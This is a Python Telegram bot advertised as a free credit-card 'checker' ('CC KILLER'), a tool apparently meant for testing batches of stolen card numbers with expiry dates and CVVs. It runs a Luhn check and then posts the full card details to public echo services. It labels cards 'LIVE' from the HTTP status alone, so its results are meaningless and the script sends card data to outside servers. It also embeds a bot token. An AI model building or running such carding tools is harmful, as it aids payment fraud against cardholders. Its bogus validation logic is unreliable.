import telebot
import re
import random
import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor

BOT_TOKEN = "8268191244:AAFVk-Y-T3wmCt25otqjZj_ol6vqgwknWLE"
ADMIN_ID = 6751771375  # YOUR TG ID

bot = telebot.TeleBot(BOT_TOKEN)

GATES = [
    "https://httpbin.org/post",
    "https://jsonplaceholder.typicode.com/posts",
    "https://postman-echo.com/post"
]

def luhn_checksum(card_number):
    digits = [int(d) for d in card_number]
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(divmod(d*2, 10))
    return checksum % 10 == 0

def parse_cc(line):
    clean = re.sub(r'[ -/]', '', line.strip())
    match = re.match(r'(\d{13,19})[^\d]*(\d{2})?[^\d]*(\d{2,4})?[^\d]*(\d{3,4})?', clean)
    if match:
        num, mon, yr, cvv = match.groups()
        return f"{num}|{mon or '12'}|{yr or '28'}|{cvv or '123'}"
    return None

def check_cc(cc):
    num, mon, yr, cvv = cc.split('|')
    
    if not luhn_checksum(num):
        return "💀 LUHN FAIL"
    
    data = {
        'cardNumber': num,
        'expMonth': mon,
        'expYear': yr,
        'cvc': cvv,
        'amount': '1.00'
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    try:
        resp = requests.post(random.choice(GATES), data=data, headers=headers, timeout=10)
        status = resp.status_code
        return f"🔥 LIVE ({status})" if status < 400 else f"❌ DEAD ({status})"
    except:
        return "⚠️ TIMEOUT/ERROR"

@bot.message_handler(commands=['start', 'help'])
def start(message):
    bot.reply_to(message, 
        "🔥 **CC KILLER FREE v2026** 🔥\n\n"
        "📤 Send:\n"
        "`4111111111111111|12|28|123`\n"
        "`4532015112830366 12/28 123`\n\n"
        "**Max 50 CCs/batch**\n"
        f"Admin: `{ADMIN_ID}`\n"
        "💀 FREE FOREVER")

@bot.message_handler(func=lambda m: True)
def checker(message):
    lines = message.text.split('\n')
    ccs = [parse_cc(line) for line in lines if parse_cc(line)]
    
    if not ccs:
        bot.reply_to(message, "❌ No valid CCs")
        return
    
    bot.reply_to(message, f"🔥 Checking **{len(ccs)}** CCs...")
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(check_cc, cc) for cc in ccs[:50]]
        for future in futures:
            result = future.result()
            cc = futures.index(future)  # Simplified
            bot.reply_to(message, f"`{ccs[futures.index(future)]}` → **{result}**")
            time.sleep(0.5)  # Rate limit

print("🚀 CC KILLER LIVE FOREVER")
bot.polling(none_stop=True)
